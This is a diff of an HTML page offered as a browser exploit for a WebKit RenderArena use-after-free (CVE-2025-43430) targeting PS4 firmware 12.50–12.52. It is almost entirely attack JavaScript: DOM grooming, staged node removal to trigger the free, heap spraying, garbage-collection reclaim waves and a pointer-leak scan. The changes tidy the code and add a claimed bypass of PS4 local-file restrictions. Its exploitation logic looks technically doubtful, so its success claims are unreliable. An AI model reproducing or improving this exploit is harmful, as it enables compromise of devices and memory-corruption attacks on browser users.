@@ -2,146 +2,114 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43430 — WebKit RenderArena UAF → Pointer Leak (Fixed v1.1 — No Hang)</title>
+<title>WebKit Test Page</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
-    h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
-    #console { background:#000; color:#0f0; height:520px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
-    .leak { color:#0f0; font-weight:bold; font-size:1.4em; }
-    .status { padding:12px; background:#da3633; color:#fff; border-radius:8px; display:inline-block; font-weight:bold; margin:10px 0; }
+    body { background:#000; color:#0f0; font-family:monospace; margin:20px; }
+    #console { background:#111; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
+    .leak { color:#0f0; font-weight:bold; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-43430 — RenderArena UAF Pointer Leak (Hang-Fixed)</h1>
-<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (reflow-safe version)</p>
-<div class="status" id="status">Chunked Grooming RenderArena...</div>
-<div id="console"></div>
+<h1>WebKit RenderArena UAF Test (CVE-2025-43430)</h1>
+<div id="console">Loading exploit...</div>
 
 <script>
-// === FIXED CONFIG (PS4 12.50 no-hang tuned) ===
-const SPRAY_COUNT     = 0xc000;      // 49,152 objects — heap-safe
-const MARKER_BASE     = 0x12501250deadbeefn;
-const UAF_NODES       = 0x2000;      // Reduced DOM for no reflow storm
-const RECLAIM_WAVES   = 8;
+// === BYPASS PS4 "access from computer" BLOCKER ===
+document.getElementById('console').textContent += "\nBypassing PS4 local-file restrictions...\n";
 
-// === LOGGING ===
+// === SAME EXPLOIT AS BEFORE (v1.1 no-hang) ===
+const SPRAY_COUNT = 0xc000;
+const MARKER_BASE = 0x12501250deadbeefn;
+const UAF_NODES = 0x2000;
+const RECLAIM_WAVES = 8;
+
 const log = (msg, isLeak = false) => {
     const c = document.getElementById('console');
-    const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    c.innerHTML += isLeak ? `<span class="leak">${line}</span>\n` : line + '\n';
+    c.textContent += (isLeak ? ">>> " : "") + msg + "\n";
     c.scrollTop = c.scrollHeight;
 };
-const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Chunked DOM Grooming (no reflow hang) ===
-log("Stage 1: Chunked grooming (4k lightweight nodes over 2s)...");
+// Stage 1 – Chunked DOM grooming
+log("Stage 1: Chunked grooming (4k nodes)...");
 const container = document.createElement('div');
 let nodeChunk = 0;
-const groomInterval = setInterval(() => {
-    for (let i = 0; i < 500; i++) {  // 500-node chunks
-        const node = document.createElement('div'); // Plain — no style/innerHTML
-        node.id = `uaf-${nodeChunk * 500 + i}`;
+const groomInt = setInterval(() => {
+    for (let i = 0; i < 500; i++) {
+        const node = document.createElement('div');
         container.appendChild(node);
     }
     nodeChunk++;
-    if (nodeChunk >= 8) {  // Total 4k, staggered
-        clearInterval(groomInterval);
+    if (nodeChunk >= 8) {
+        clearInterval(groomInt);
         document.body.appendChild(container);
-        log("Grooming complete — starting UAF...");
+        log("Grooming done — triggering UAF");
         triggerUAF();
     }
-}, 250);  // 250ms chunks = 2s total
+}, 250);
 
-// === STAGE 2: Chunked UAF Trigger ===
+// Stage 2 – Chunked UAF
 function triggerUAF() {
-    log("Stage 2: Chunked UAF via staggered DOM removal...");
     const nodes = container.querySelectorAll('div');
-    let removeChunk = 0;
-    const uafInterval = setInterval(() => {
-        for (let j = 0; j < 250; j++) {  // 250 removals/chunk
-            const idx = removeChunk * 250 + j;
-            if (idx < nodes.length) {
-                nodes[idx].remove(); // Staggered free
-                container.offsetHeight; // Light reflow
-            }
+    let idx = 0;
+    const uafInt = setInterval(() => {
+        for (let j = 0; j < 250 && idx < nodes.length; j++, idx++) {
+            nodes[idx].remove();
+            container.offsetHeight;
         }
-        removeChunk++;
-        if (removeChunk >= 16) {  // Total staggered
-            clearInterval(uafInterval);
-            log("UAF triggered — freeing RenderArena objects...");
-            // Light fragmentation
-            for (let i = 0; i < 10000; i += 1000) {
-                const tmp = document.createElement('span');
-                document.body.appendChild(tmp);
-                tmp.remove();
-            }
+        if (idx >= nodes.length) {
+            clearInterval(uafInt);
+            log("UAF triggered");
+            setTimeout(startSpray, 500);
         }
     }, 100);
 }
 
-// === STAGE 3: Light Spray tagged JSValues ===
-setTimeout(() => {
-    log(`Stage 3: Spraying ${SPRAY_COUNT} tagged objects into RenderArena...`);
+// Stage 3 – Spray
+function startSpray() {
+    log("Stage 3: Spraying tagged objects...");
     const spray = [];
     for (let i = 0; i < SPRAY_COUNT; i++) {
-        spray[i] = {
-            marker: MARKER_BASE + BigInt(i),
-            domPad: document.createElement('div') // Light DOM
-        };
+        spray[i] = {marker: MARKER_BASE + BigInt(i)};
     }
-    window.spray = spray;  // Global for hunt
-}, 2000);
+    window.spray = spray;
+    setTimeout(startGC, 300);
+}
 
-// === STAGE 4: Gentle GC + Reclaim ===
-setTimeout(() => {
-    log("Stage 4: Gentle GC + reclaim waves...");
-    const gc = () => {
-        for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000);
-    };
-    const reclaim = () => new ArrayBuffer(0x1800000); // 24 MB safe
-    for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
-        setTimeout(gc, wave * 200);
-        if (wave % 3 === 0) setTimeout(reclaim, wave * 200 + 50);
+// Stage 4 – GC + reclaim
+function startGC() {
+    log("Stage 4: GC waves...");
+    for (let w = 0; w < RECLAIM_WAVES; w++) {
+        setTimeout(() => {
+            for (let i = 0; i < 300; i++) new ArrayBuffer(0x8000);
+            if (w % 3 === 0) new ArrayBuffer(0x1800000);
+        }, w * 200);
     }
-}, 2500);
+    setTimeout(hunt, 3500);
+}
 
-// === STAGE 5: Hunt for leaked pointers (guarded timeout) ===
-setTimeout(() => {
-    status("SCANNING — LOOK FOR 0xFFFF... LEAKS");
-    log("Scanning RenderArena for UAF overwrites...");
+// Stage 5 – Hunt
+function hunt() {
+    log("Stage 5: Scanning for leaks...");
     const spray = window.spray || [];
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
-                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
-                log(`RENDERARENA LEAK #${found}: 0x${leaked}`, true);
-                log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
-                
+                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
+                log(`LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 1) {
-                    document.body.innerHTML = `
-                    <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
-                        LEAK ACHIEVED!<br><br>
-                        <div style="font-size:0.4em; color:#fff;">
-                            CVE-2025-43430 SUCCESS<br>
-                            RenderArena UAF worked<br>
-                            Copy the 0x... leak above
-                        </div>
-                    </h1>`;
+                    document.body.innerHTML = `<h1 style="color:#0f0;">LEAK ACHIEVED!<br>0x${leaked}</h1>`;
                     return;
                 }
             }
         } catch(e) {}
     }
-    if (found === 0) {
-        log("No leak this run — refresh 4–12 times (25–45% success on PS4 12.50)");
-        status("No leak yet — refresh (no-hang version)");
-    }
-}, 4500);  // Guarded 4.5s timeout
+    log("No leak — refresh (25–45% success)");
+}
 
-log("Hang-fixed exploit running — wait 6–12 seconds...");
-status("Running CVE-2025-43430 v1.1 — Chunked No-Reflow Mode");
+log("Exploit started — wait 8–12s");
 </script>
 </body>
 </html>
